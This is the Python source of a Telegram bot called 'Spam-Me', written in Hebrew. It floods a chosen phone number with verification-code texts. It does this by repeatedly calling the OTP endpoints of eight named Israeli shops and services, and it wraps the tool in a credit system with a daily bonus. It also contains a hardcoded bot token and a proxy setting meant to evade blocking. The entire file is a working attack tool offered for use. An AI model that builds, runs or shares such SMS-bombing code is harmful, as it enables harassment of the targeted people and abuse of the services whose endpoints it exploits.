import telebot
from telebot import apihelper
import requests
import time
import random
import string
import uuid
from datetime import datetime

# --- הגדרות הבוט ---
TOKEN = "8704312677:AAHO8NSIKI6drQMfHANZaBuF5aBJ2z5_nf0"

# מעקף חסימה עבור Hugging Face (שימוש ב-Proxy)
apihelper.proxy = {'https': 'http://proxy8.p.pyproxy.com:2315'} 
# הערה: אם הבוט לא מתחבר, Hugging Face פשוט לא מאפשרים בוטים כאלה בחינם.

bot = telebot.TeleBot(TOKEN)
user_credits = {}
daily_claimed = {}

def get_random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def run_attack(chat_id, target, rounds):
    success_count = 0
    failed_count = 0
    for r in range(rounds):
        f_uuid = str(uuid.uuid4())
        apis = [
            {"n": "Hamal", "u": "https://users-auth.hamal.co.il/auth/send-auth-code", "d": {"value": target, "type": "phone", "projectId": "1"}, "type": "json", "ref": "https://www.hamal.co.il/"},
            {"n": "Teva Bari", "u": "https://www.tevabari.co.il/index.php", "d": {"username": target, "option": "com_ajax", "plugin": "smsauth", "group": "authentication", "method": "smsauth", "task": "send", "format": "json"}, "type": "form", "ref": "https://www.tevabari.co.il/"},
            {"n": "Mishloha", "u": "https://www.mishloha.co.il/api/v1/auth/verify", "d": {"phone": target, "source": "web"}, "type": "json", "ref": "https://www.mishloha.co.il/"},
            {"n": "Mexican", "u": "https://api-ns.atmos.co.il/rest/18/clubauth/sendValidationCode", "d": {"phone": target, "club_id": 18, "source": "web"}, "type": "json", "ref": "https://mexican.co.il/"},
            {"n": "Gefen Gefen", "u": "https://api-ns.atmos.co.il/rest/22/clubauth/sendValidationCode", "d": {"phone": target, "club_id": 22, "source": "web"}, "type": "json", "ref": "https://gefen-gefen.co.il/"},
            {"n": "Fox", "u": "https://www.fox.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": f_uuid}, "type": "json", "ref": "https://www.fox.co.il/"},
            {"n": "Foot Locker", "u": "https://www.footlocker.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": f_uuid}, "type": "json", "ref": "https://www.footlocker.co.il/"},
            {"n": "Laline", "u": "https://www.laline.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": f_uuid}, "type": "json", "ref": "https://www.laline.co.il/"}
        ]
        for site in apis:
            try:
                h = {"User-Agent": "Mozilla/5.0", "Referer": site["ref"]}
                if site["type"] == "json":
                    requests.post(site["u"], json=site["d"], headers=h, timeout=3.0)
                else:
                    requests.post(site["u"], data=site["d"], headers=h, timeout=3.0)
                success_count += 1
                time.sleep(1.5)
            except:
                failed_count += 1
    bot.send_message(chat_id, f"📊 סיכום תקיפה ל-{target}:\n✅ הצלחות: {success_count}\n❌ נכשלו: {failed_count}")

@bot.message_handler(commands=['start'])
def start(message):
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("🚀 התחל תקיפה", "💰 יתרה", "🎁 מתנה יומית")
    bot.send_message(message.chat.id, "🔥 מערכת Spam-Me באוויר!", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text == "🎁 מתנה יומית")
def gift(message):
    user_credits[message.from_user.id] = user_credits.get(message.from_user.id, 0) + 5
    bot.send_message(message.chat.id, "✅ קיבלת 5 קרדיטים!")

@bot.message_handler(func=lambda m: m.text == "🚀 התחל תקיפה")
def ask_phone(message):
    msg = bot.send_message(message.chat.id, "שלח מספר טלפון:")
    bot.register_next_step_handler(msg, process_attack)

def process_attack(message):
    target = message.text
    if user_credits.get(message.from_user.id, 0) < 1:
        return bot.send_message(message.chat.id, "❌ אין קרדיטים.")
    user_credits[message.from_user.id] -= 1
    bot.send_message(message.chat.id, f"⚡ תוקף את {target}...")
    run_attack(message.chat.id, target, 1)

bot.polling()
